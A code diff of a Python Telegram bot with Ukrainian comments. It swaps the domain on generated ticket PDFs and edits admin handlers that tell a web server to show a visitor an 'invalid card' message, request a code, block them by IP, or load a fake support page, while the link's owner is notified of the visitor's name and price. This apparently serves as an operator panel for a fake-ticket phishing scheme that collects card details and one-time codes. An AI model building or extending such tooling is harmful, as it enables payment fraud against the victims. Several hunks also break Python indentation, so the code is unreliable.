@@ -1782,7 +1782,7 @@ async def ticket_input_handler(message: types.Message):
         top_y = height - 40
         c.setFont("Helvetica-Bold", 20)
         c.setFillColorRGB(0.7, 0.7, 0.7)
-        c.drawCentredString(width / 2, top_y, "artpullse.com")
+        c.drawCentredString(width / 2, top_y, "events-art.com")
         
         # Имя крупно по центру
         name_y = top_y - 35
@@ -2842,7 +2842,7 @@ async def admin_action_handler(call: types.CallbackQuery):
                 print(f'[DEBUG] Push response: {resp.status}')
                 
                 if resp.status == 200:
-                    # Надсилаємо красиве повідомлення адміну, чия це посилання
+                # Надсилаємо красиве повідомлення адміну, чия це посилання
                     admin_user_id = None
                     c = conn.cursor()
                     c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
@@ -2882,15 +2882,15 @@ async def admin_action_handler(call: types.CallbackQuery):
             try:
                 resp = await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
                 print(f'[DEBUG] {action.upper()} response: {resp.status}')
-                
+        
                 if resp.status == 200:
-                    if action == 'card':
+        if action == 'card':
                         await call.answer("✅ Сигнал про невірну карту надіслано на сайт")
-                    elif action == 'block':
+        elif action == 'block':
                         await call.answer("✅ Користувач заблокований на сайті")
-                    elif action == 'unblock':
+        elif action == 'unblock':
                         await call.answer("✅ Користувач розблокований на сайті")
-                    elif action == 'code':
+        elif action == 'code':
                         await call.answer("✅ Код запитується на сайті")
                 else:
                     await call.answer("❌ Помилка виконання дії")
@@ -2912,28 +2912,28 @@ async def admin_action_handler(call: types.CallbackQuery):
             try:
                 resp = await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
                 print(f'[DEBUG] Support response: {resp.status}')
-                
+        
                 if resp.status == 200:
-                    # Надсилаємо красиве повідомлення про технічну підтримку
-                    if ip and page_code:  # Додаємо перевірку page_code
-                        admin_user_id = None
-                        c = conn.cursor()
-                        c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
-                        row = c.fetchone()
-                        if row:
-                            admin_user_id = row[0]
-                        
-                        if admin_user_id:
-                            admin_username = get_admin_username_by_user_id(admin_user_id)
-                            support_message = format_support_notification_message(
-                                admin_username=admin_username,
-                                name=user_name,
-                                price=event_price,
-                                currency=event_currency
-                            )
-                            await bot.send_message(admin_user_id, support_message)
-                            print(f'[DEBUG] Support message sent to admin {admin_user_id}')
-                    
+        # Надсилаємо красиве повідомлення про технічну підтримку
+        if ip and page_code:  # Додаємо перевірку page_code
+            admin_user_id = None
+            c = conn.cursor()
+            c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+            row = c.fetchone()
+            if row:
+                admin_user_id = row[0]
+            
+            if admin_user_id:
+                admin_username = get_admin_username_by_user_id(admin_user_id)
+                support_message = format_support_notification_message(
+                    admin_username=admin_username,
+                    name=user_name,
+                    price=event_price,
+                    currency=event_currency
+                )
+                await bot.send_message(admin_user_id, support_message)
+                print(f'[DEBUG] Support message sent to admin {admin_user_id}')
+        
                     await call.answer("✅ Сторінка техпідтримки завантажена на сайті")
                 else:
                     await call.answer("❌ Помилка завантаження сторінки техпідтримки")
